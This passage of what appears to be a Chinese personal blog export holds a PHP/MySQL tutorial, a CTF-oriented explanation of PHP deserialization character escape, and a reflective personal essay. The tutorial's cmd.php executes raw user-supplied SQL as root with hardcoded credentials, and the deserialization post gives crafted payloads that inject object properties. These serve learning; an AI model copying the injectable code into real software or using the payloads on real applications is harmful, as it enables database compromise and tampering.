class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>访问页面</p><p><img src="%5Cimg%5C%E8%BF%9E%E6%8E%A5%E6%95%B0%E6%8D%AE%E5%BA%93.png" alt=""></p><p>这里输入啥就可以登陆啥了，我这里以root用户登录localhost</p><p>连接成功！</p><p><img src="%5Cimg%5C%E8%BF%9E%E6%8E%A5%E6%88%90%E5%8A%9F.png" alt=""></p><p>我这里设计了一个可以提交mysql命令的页面（注入漏洞警告！）</p><p><img src="%5Cimg%5C%E6%8F%90%E4%BA%A4%E5%91%BD%E4%BB%A4.png" alt=""></p><p>提交以后，嘻嘻，这样就没法注入了吧</p><p><img src="%5Cimg%5C%E6%88%90%E5%8A%9F%E4%BA%86%E4%B9%9F%E4%B8%8D%E7%BB%99%E4%BD%A0%E7%9C%8B.png" alt=""></p><p>cmd.php的源码</p><pre class="line-numbers language-php+HTML"><code class="language-php+HTML"><?php$servername='localhost';$username='root';$password='root';// $dbname=$_GET['dbname'];$sql = new mysqli($servername,$username,$password);if($_GET['cmd']){        $cmd=$_GET['cmd'];        if($sql->query($cmd))        {                echo "命令执行成功，但我就不给你看结果,嘻嘻";        }        else{                echo "执行失败"."Error:".$sql->error;        }}else{?><!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>输入SQL命令</title></head><body><p>输入SQL命令：</p><form action="cmd.php" mothod="get"><input type="text" name="cmd" value="USE mysql"><input type="submit" value="提交"></form></body></html><?php}?><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>实际上，应该用session来继承从index页面获得的数据，这里我偷个懒，用session的实现留到以后再说</p><p>。。。</p><p>好的，三天过去了。我来接着水用cookie或session来实现的方法了</p><p>只要将上面的代码改造一点点，改成下面这样</p><pre class="line-numbers language-php+HTML"><code class="language-php+HTML">//index.php<?phpif($_POST['servername']&&$_POST['username']&&$_POST['passwd']){        $servername=$_POST['servername'];        $username=$_POST['username'];        $password=$_POST['passwd'];// $dbname=$_GET['dbname'];        $sql = new mysqli($servername,$username,$password);        if($sql->connect_error)        {                die("连接失败：".$sql->connect_error);        }        else        {                session_start();                //开启session                $lifetime=3600 * 24;    //设置cookie生存周期为1天                setcookie(session_name(),session_id(),time() + $lifetime,"/");                //如果没有这行代码，服务器也会生成一个临时session                $_SESSION['servername']=$servername;                $_SESSION['username']=$username;                $_SESSION['passwd']=$password;                echo "<script>alert(\"连接成功\")</script>";                // header('Location:cmd.php');                // exit;                $url = "cmd.php";                echo "<script language='javascript' type='text/javascript'>";                echo "window.location.href='$url'";                echo "</script>";        }}else{?><!DOCTYPE html><html lang="en"><head>        <meta charset="UTF-8">        <meta name="viewport" content="width=device-width, initial-scale=1.0">        <title>连接数据库</title></head><body>        <p>        请输入服务器，用户名以及密码        </p>        <form action="index.php" method="post">        服务器：<input type="text" name="servername">        用户名：<input type="text" name="username">        密码：<input type="password" name="passwd">        <input type="submit" value="提交">        </form>        <p id="success">        </p></body></html><?php}?><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-php+HTML"><code class="language-php+HTML">//cmd.php<?phpsession_start();$servername=$_SESSION['servername'];$username=$_SESSION['username'];$password=$_SESSION['passwd'];// $dbname=$_GET['dbname'];$sql = new mysqli($servername,$username,$password);if($sql->connect_error){        die("连接失败".$sql->connect_error);}if(!empty($_POST['cmd'])){        $cmd=$_POST['cmd'];        if($sql->query("$cmd")===TRUE)        {                echo "命令执行成功，但我就不给你看结果,嘻嘻";        }        else{                echo "执行失败"."Error:".$sql->error;        }}else{?><!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>输入SQL命令</title></head><body><p>输入SQL命令：</p><form action="cmd.php" method="post">        <input type="text" name="cmd" value="USE mysql">        <input type="submit" value="提交"></form></body></html><?php}?><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>上面代码开启了session，配置cookie保存session ID（手动设置了session生存周期为1天），用session保存了’servername’，’username’，’password’（一般来说最好不要保存这么多重要信息），并在index.php转到cmd.php时用session保证信息传递</p><p>运行结果</p><p><img src="E:%5C%E6%96%87%E6%A1%A3%5CGithub%E4%BB%93%E5%BA%93%5CLiGuHeiYi%5CLiGuHeiYi.github.io%5Cimg%5Csession%E8%BF%9E%E6%8E%A5.png" alt=""></p><p><img src="E:%5C%E6%96%87%E6%A1%A3%5CGithub%E4%BB%93%E5%BA%93%5CLiGuHeiYi%5CLiGuHeiYi.github.io%5Cimg%5Csession%E8%BF%9E%E6%8E%A5%E5%BC%B9%E7%AA%97.png" alt=""></p><p><img src="E:%5C%E6%96%87%E6%A1%A3%5CGithub%E4%BB%93%E5%BA%93%5CLiGuHeiYi%5CLiGuHeiYi.github.io%5Cimg%5Csession%E8%BF%9E%E6%8E%A5%E6%88%90%E5%8A%9F.png" alt=""></p><p><strong>没有报错，所以利用session传递用户信息和连接数据库成功了。</strong></p><h2 id="用PDO连接mysql数据库"><a href="#用PDO连接mysql数据库" class="headerlink" title="用PDO连接mysql数据库"></a>用PDO连接mysql数据库</h2><p>在Windows用pdo之前需要在php.ini里，将pdo拓展打开，具体方法是将# extension = php_pdo.dll这一行注释去掉(phpstudy已经做完了这一步)，然后需要连接哪种数据库就再去掉哪种数据库的注释。PDO(php database object)最大的优点就是可以连接不止mysql这一种数据库，比较方便的地方是可以使用异常类来处理程序运行时出现的问题，像下面代码可以将执行部分放在try{}模块中，发生异常直接获得信息，不用像上面sqli一样每次都判断一下执行是否成功</p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token variable">$servername</span> <span class="token operator">=</span> <span class="token string">"localhost"</span><span class="token punctuation">;</span><span class="token variable">$username</span> <span class="token operator">=</span> <span class="token string">"root"</span><span class="token punctuation">;</span><span class="token variable">$password</span> <span class="token operator">=</span> <span class="token string">"root"</span><span class="token punctuation">;</span><span class="token keyword">try</span> <span class="token punctuation">{</span>    <span class="token variable">$conn</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">PDO</span><span class="token punctuation">(</span><span class="token string">"mysql:host=$servername;"</span><span class="token punctuation">,</span> <span class="token variable">$username</span><span class="token punctuation">,</span> <span class="token variable">$password</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//建立连接对象</span>    <span class="token keyword">echo</span> <span class="token string">"连接成功"</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">catch</span><span class="token punctuation">(</span>PDOException <span class="token variable">$e</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">echo</span> <span class="token variable">$e</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">getMessage</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>还是放到phpstudy的本地网站里，打开网站</p><p>![](\img\pdo connect.png)</p><h2 id="预处理语句及绑定参数"><a href="#预处理语句及绑定参数" class="headerlink" title="预处理语句及绑定参数"></a>预处理语句及绑定参数</h2><p>预处理语句用于执行多个相同的 SQL 语句，并且执行效率更高。</p><p>预处理语句的工作原理如下：</p><ol><li><p>预处理：<strong>创建 SQL 语句模板</strong>并发送到数据库。预留的值使用参数 “<strong>?</strong>“ 标记 。例如：</p><pre><code>INSERT INTO MyGuests (firstname, lastname, email) VALUES(?, ?, ?)</code></pre></li><li><p>数据库解析，编译，对SQL语句模板执行查询优化，并存储结果不输出。</p></li><li><p>执行：最后，将应用绑定的值传递给参数（”?” 标记），数据库执行语句。应用可以多次执行语句，如果参数的值不一样。</p></li></ol><p>相比于直接执行SQL语句，预处理语句有两个主要优点：</p><ul><li><p>预处理语句大大减少了分析时间，只做了一次查询（虽然语句多次执行）。</p></li><li><p>绑定参数减少了服务器带宽，你只需要发送查询的参数，而不是整个语句。</p></li><li><p>预处理语句针对SQL注入是非常有用的，因为参数值发送后使用不同的协议，保证了数据的合法性。</p><h3 id="PDO-中的预处理语句"><a href="#PDO-中的预处理语句" class="headerlink" title="PDO 中的预处理语句"></a>PDO 中的预处理语句</h3><h4 id="实例-PDO-使用预处理语句"><a href="#实例-PDO-使用预处理语句" class="headerlink" title="实例 (PDO 使用预处理语句)"></a>实例 (PDO 使用预处理语句)</h4><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token variable">$servername</span> <span class="token operator">=</span> <span class="token string">"localhost"</span><span class="token punctuation">;</span><span class="token variable">$username</span> <span class="token operator">=</span> <span class="token string">"root"</span><span class="token punctuation">;</span><span class="token variable">$password</span> <span class="token operator">=</span> <span class="token string">"root"</span><span class="token punctuation">;</span><span class="token variable">$dbname</span> <span class="token operator">=</span> <span class="token string">"myDBPDO"</span><span class="token punctuation">;</span><span class="token keyword">try</span> <span class="token punctuation">{</span>    <span class="token variable">$conn</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">PDO</span><span class="token punctuation">(</span><span class="token string">"mysql:host=$servername;dbname=$dbname"</span><span class="token punctuation">,</span> <span class="token variable">$username</span><span class="token punctuation">,</span> <span class="token variable">$password</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">// 设置 PDO 错误模式为异常</span>    <span class="token variable">$conn</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">setAttribute</span><span class="token punctuation">(</span><span class="token constant">PDO</span><span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token constant">ATTR_ERRMODE</span><span class="token punctuation">,</span> <span class="token constant">PDO</span><span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token constant">ERRMODE_EXCEPTION</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">// 预处理 SQL 并绑定参数</span>    <span class="token variable">$stmt</span> <span class="token operator">=</span> <span class="token variable">$conn</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">prepare</span><span class="token punctuation">(</span>"<span class="token constant">INSERT</span> <span class="token constant">INTO</span> <span class="token function">MyGuests</span> <span class="token punctuation">(</span>firstname<span class="token punctuation">,</span> lastname<span class="token punctuation">,</span> email<span class="token punctuation">)</span>     <span class="token function">VALUES</span> <span class="token punctuation">(</span><span class="token punctuation">:</span>firstname<span class="token punctuation">,</span> <span class="token punctuation">:</span>lastname<span class="token punctuation">,</span> <span class="token punctuation">:</span>email<span class="token punctuation">)</span>"<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$stmt</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">bindParam</span><span class="token punctuation">(</span><span class="token string">':firstname'</span><span class="token punctuation">,</span> <span class="token variable">$firstname</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$stmt</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">bindParam</span><span class="token punctuation">(</span><span class="token string">':lastname'</span><span class="token punctuation">,</span> <span class="token variable">$lastname</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$stmt</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">bindParam</span><span class="token punctuation">(</span><span class="token string">':email'</span><span class="token punctuation">,</span> <span class="token variable">$email</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">// 插入多行数据</span>    <span class="token variable">$firstname</span> <span class="token operator">=</span> <span class="token string">"John"</span><span class="token punctuation">;</span>    <span class="token variable">$lastname</span> <span class="token operator">=</span> <span class="token string">"Doe"</span><span class="token punctuation">;</span>    <span class="token variable">$email</span> <span class="token operator">=</span> <span class="token string">"john@example.com"</span><span class="token punctuation">;</span>    <span class="token variable">$stmt</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">execute</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$firstname</span> <span class="token operator">=</span> <span class="token string">"Mary"</span><span class="token punctuation">;</span>    <span class="token variable">$lastname</span> <span class="token operator">=</span> <span class="token string">"Moe"</span><span class="token punctuation">;</span>    <span class="token variable">$email</span> <span class="token operator">=</span> <span class="token string">"mary@example.com"</span><span class="token punctuation">;</span>    <span class="token variable">$stmt</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">execute</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$firstname</span> <span class="token operator">=</span> <span class="token string">"Julie"</span><span class="token punctuation">;</span>    <span class="token variable">$lastname</span> <span class="token operator">=</span> <span class="token string">"Dooley"</span><span class="token punctuation">;</span>    <span class="token variable">$email</span> <span class="token operator">=</span> <span class="token string">"julie@example.com"</span><span class="token punctuation">;</span>    <span class="token variable">$stmt</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">execute</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token string">"新记录插入成功"</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">catch</span><span class="token punctuation">(</span>PDOException <span class="token variable">$e</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">echo</span> <span class="token string">"Error: "</span> <span class="token punctuation">.</span> <span class="token variable">$e</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">getMessage</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token variable">$conn</span> <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span><span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ul><h2 id="关闭连接"><a href="#关闭连接" class="headerlink" title="关闭连接"></a>关闭连接</h2><p>连接在脚本执行完后会自动关闭。但也可以使用以下代码来关闭连接：</p><h4 id="实例-MySQLi-面向对象"><a href="#实例-MySQLi-面向对象" class="headerlink" title="实例 (MySQLi - 面向对象)"></a>实例 (MySQLi - 面向对象)</h4><pre class="line-numbers language-php"><code class="language-php"><span class="token variable">$conn</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="实例-MySQLi-面向过程"><a href="#实例-MySQLi-面向过程" class="headerlink" title="实例 (MySQLi - 面向过程)"></a>实例 (MySQLi - 面向过程)</h4><pre class="line-numbers language-php"><code class="language-php"><span class="token function">mysqli_close</span><span class="token punctuation">(</span><span class="token variable">$conn</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="实例-PDO"><a href="#实例-PDO" class="headerlink" title="实例 (PDO)"></a>实例 (PDO)</h4><pre class="line-numbers language-php"><code class="language-php"><span class="token variable">$conn</span> <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> blog </category>
          
      </categories>
      
      
        <tags>
            
            <tag> php </tag>
            
            <tag> MySQL </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>php反序列化字符逃逸</title>
      <link href="/2020/09/21/2020-09-20-php-fan-xu-lie-hua-zi-fu-tao-yi/"/>
      <url>/2020/09/21/2020-09-20-php-fan-xu-lie-hua-zi-fu-tao-yi/</url>
      
        <content type="html"><![CDATA[<h1 id="PHP反序列化字符逃逸"><a href="#PHP反序列化字符逃逸" class="headerlink" title="PHP反序列化字符逃逸"></a>PHP反序列化字符逃逸</h1><p>读题目源码的时候，一旦看到”serialize()”和”replace”(比如str_replace(),preg_replace()等)，就基本可以开始往反序列化逃逸的方向考虑了<br>反序列化字符逃逸都大同小异，基本可以分为“替换后字符串变长”和“替换后字符串变短的</p><p>其核心原理都是利用替换后变长或变短的字符串“顶出”后一个属性并将payload替换进去，或“吞并”后一个属性值的一部分，使我们在后一个属性中构建的payload成为我们想要的属性</p><h2 id="替换之后字符串变长"><a href="#替换之后字符串变长" class="headerlink" title="替换之后字符串变长"></a>替换之后字符串变长</h2><p>示例代码:</p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token keyword">function</span> <span class="token function">filter</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">return</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string">'bb'</span><span class="token punctuation">,</span> <span class="token string">'ccc'</span><span class="token punctuation">,</span> <span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">class</span> <span class="token class-name">A</span><span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token variable">$name</span><span class="token operator">=</span><span class="token string">'aaaa'</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$pass</span><span class="token operator">=</span><span class="token string">'123456'</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token variable">$AA</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">A</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$AA</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token string">"\n"</span><span class="token punctuation">;</span><span class="token variable">$res</span><span class="token operator">=</span><span class="token function">filter</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$AA</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$c</span><span class="token operator">=</span><span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$res</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token variable">$c</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">pass</span><span class="token punctuation">;</span><span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>上面这段代码中的filter()函数，会将传入的字符串 $str 中的’bb’替换为’ccc’，替换后字符串变长</p><p>其后对$AA进行序列化然后调用了这个filter函数并反序列化输出，这就构成了一个反序列化字符逃逸漏洞</p><p>如果这时我们有办法构造payload更改$AA中的内容，便可以利用这个漏洞，因为只要$name或$pass属性中每多一对’bb’字符，便会使之后的$res中字符多一个</p><p>而unserialize函数读取序列化字符串时，是通过s:所指定的长度和;”}来判断一个属性的结束的，这二者缺一不可，如果没有s所指定的长度，unserialize()就会在读到;”}时结束一个属性的读取，也就是如果属性的值中有;”}，就可以直接“骗”过它，让它认为这段字符串结束了，但一般来说，s指定了字符串的长度让它不会轻易“受骗”。</p><p>但filter函数给了我们一个“戏弄”它的机会，因为每个’bb’字符串都会使最终的字符串长度多一位，让实际的字符串比s所记录的长一位。仅仅只长一位没什么，php会报错，但如果在’bb’字符串后面的内容是”;}呢？如果name的内容是”bbbbbb”;}”,则序列化后，s的值为9，在被filter函数过滤后为”ccccccccc”;}”,那么因为s为9，unserialize函数只会读到最后一个’c’处,由于后面是;”}，它便会认为这串字符结束了。</p><p>这便是反序列化字符逃逸的基本原理了，利用这种方式，我们就能任意构造name属性后面的内容，比如更改pass的内容，甚至添加一个“本不应该存在的属性”。如：构造name=“bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb”;s:4:”pass”;s:11:”Hello,world”;}“, 这里面有33个’bb’, 紧跟其后的”;s:11:”Hello,world”;}也是33个字符，这样经过filter函数替换后,多出来的33个’c’会“顶”掉后面的”;s:4:”pass”;s:11:”Hello,world”;}，并使后者被当作pass属性读入，这样，最终name的值为33个’ccc’，而pass的值就变为Hello,world</p><h2 id="替换后字符变短"><a href="#替换后字符变短" class="headerlink" title="替换后字符变短"></a>替换后字符变短</h2><p>这种情况和上面那种大同小异，核心原理都是一样的，“替换后字符串长度改变，在字符串中构造payload”。唯一不同的大概是，上面这种payload构造在被替换的字符串里面，这种的payload构造在下一个属性的字符串里面</p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token keyword">function</span> <span class="token function">filter</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">return</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string">'bbb'</span><span class="token punctuation">,</span> <span class="token string">'cc'</span><span class="token punctuation">,</span> <span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">class</span> <span class="token class-name">A</span><span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token variable">$name</span><span class="token operator">=</span><span class="token string">'aaaa'</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$pass</span><span class="token operator">=</span><span class="token string">'123456'</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token variable">$AA</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">A</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$AA</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token string">"\n"</span><span class="token punctuation">;</span><span class="token variable">$res</span><span class="token operator">=</span><span class="token function">filter</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$AA</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$c</span><span class="token operator">=</span><span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$res</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token variable">$c</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">pass</span><span class="token punctuation">;</span><span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>还是这串代码，不同的地方仅仅是从用’ccc’替换’bb’变成了用’cc’替换’bbb’ </p><p>这时，构造name=bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb,pass=123456”;s:5:”pass2”;s:5:”Hello”;}</p><p>这里面有24个’bbb’，经过filter后会缩短24个字符，刚好可以包裹 “;s:4:”pass”;s:6:”123456 这一段，于是后一段”;s:5:”pass2”;s:5:”Hello”;}就被当作另一个属性被读进去了，这样我们又能更改本来不能更改的属性的内容甚至添加属性了</p><p>反序列化字符逃逸的应用条件十分苛刻，一般只有比赛的时候用的上，但终归是一种漏洞，其基本原理就在这里了</p><p>更新知识点</p><h2 id="public-、public、protected"><a href="#public-、public、protected" class="headerlink" title="public 、public、protected"></a>public 、public、protected</h2><p>​    访问修饰符，分别对应着类中的 公有、私有、受保护成员。<a href="https://blog.csdn.net/jiangnanqbey/article/details/81386527" target="_blank" rel="noopener">引用解释</a><br>​    不同的访问修饰符对应的序列化也有不同。<br>​<br>​    各访问修饰符序列化后的区别：</p><pre><code>    public：属性被序列化的时候属性名还是原来的属性名，没有任何改变    protected：属性被序列化的时候属性名会变成 %00*%00属性名，长度跟随属性名长度而改变    private：属性被序列化的时候属性名会变成 %00类名%00属性名，长度跟随属性名长度而改变</code></pre><p>加<code>%00</code>的目的就是用于替代<code>\0</code> ，那为什么不直接加<code>\0</code>呢？<a href="https://blog.csdn.net/weixin_44077544/article/details/103542260" target="_blank" rel="noopener">引用解释</a></p><p>直接在url输入框里输入%00即可,burpsuite也行，hackbar不行，hackbar还会再转码一次。</p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> blog </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> php字符反序列化 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>你好，世界！</title>
      <link href="/2020/03/02/2020-03-02-how-to-live/"/>
      <url>/2020/03/02/2020-03-02-how-to-live/</url>
      
        <content type="html"><![CDATA[<h1 id="你好，世界！"><a href="#你好，世界！" class="headerlink" title="你好，世界！"></a>你好，世界！</h1><p>​    我想应该所有人（除非真有人已经自大到目空一切的地步），都经常会在一人独处时默默自省吧。</p><p>​    我是个年仅19岁的年轻人，若说有什么人生阅历，那是不可能的。但我也一眨眼就活过了近20年的岁月，20年，总也不算太短。</p><p>这20年的前十年，我想我过得还算快乐（或者我已经把不快乐的部分忘得差不多了，那同样也证明这10年是快乐的）。而这后面十年，</p><p>或许记忆里更多的就是青春的迷惑和成长的痛苦了。</p><p>​    这些所谓的痛苦从何而来？或许是，我给自己定的行为准则与我本身的性格产生的矛盾。</p><p>​    我一直都是个不好不坏的人：有不好不坏的性格，不好不坏的人际交往，不好不坏的家庭，不好不坏的成绩，上一个不好不坏的大学，若事情就这样发展下去，或许最后我会拿一个不好不坏的成绩毕业，找一份不好不坏的程序员工作，拿一份不好不坏的工资，找个不好不坏的老婆，组个不好不坏的家庭，生个不好不坏的孩子，不好不坏的养他（她）长大，退休后和几个关系不好不坏的老伙计整天玩乐，最后不好不坏的过完这一生。</p><p>​    为什么我每件事都做得不好不坏？无论大事小事，就没有做的特别出类拔萃的？（追求出类拔萃，这也是一个痛苦的源泉吧，可我确实不甘心不好不坏、不上不下地过完这一生）因为我不能做到“取舍”。</p><p>​    “舍得”，是我这辈子做的最差的事，无论事大事小，我“舍不得”，这就是为什么我永远看起来还可以却又不是很出色。或许我是有一些能力的，能够把一些事情做好，但并不能把所有事情做好，而那些不是非常重要而又有些在意的东西，我学不会割舍。</p><p>​    但仅仅将我现在的处境归咎于不会“割舍”，实在是过于粗暴了。我一直在找一种平衡，一种精神世界与现实生活之间融洽相处的平衡点，可这样的平衡点或许并不存在。人生本来就有很多求而不得的事，对于那样的事，无需多想，就尽自己<strong>应该尽的力</strong>，尔后将它的结果交给老天来决定好了。而那些可望而可求的事，才是更重要、最值得付出最大限度地精力与意愿去达成它。但又不应该觉得“努力了就能成功”，这个世界上，没有谁是主角，能够永远成功，永远顺心如意。</p><p>​    学会割舍，学会接受失败，学会接受自己，找到真实的自己。尽力而行，量力而行。</p><p>​    最重要的，找到活在这人世间的快乐，始终牢记自己为了什么而努力，不是为了那些世俗的价值和欲望，是为了“<strong>我</strong>”。好好的生活，享受这世间的每一分每一秒。</p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
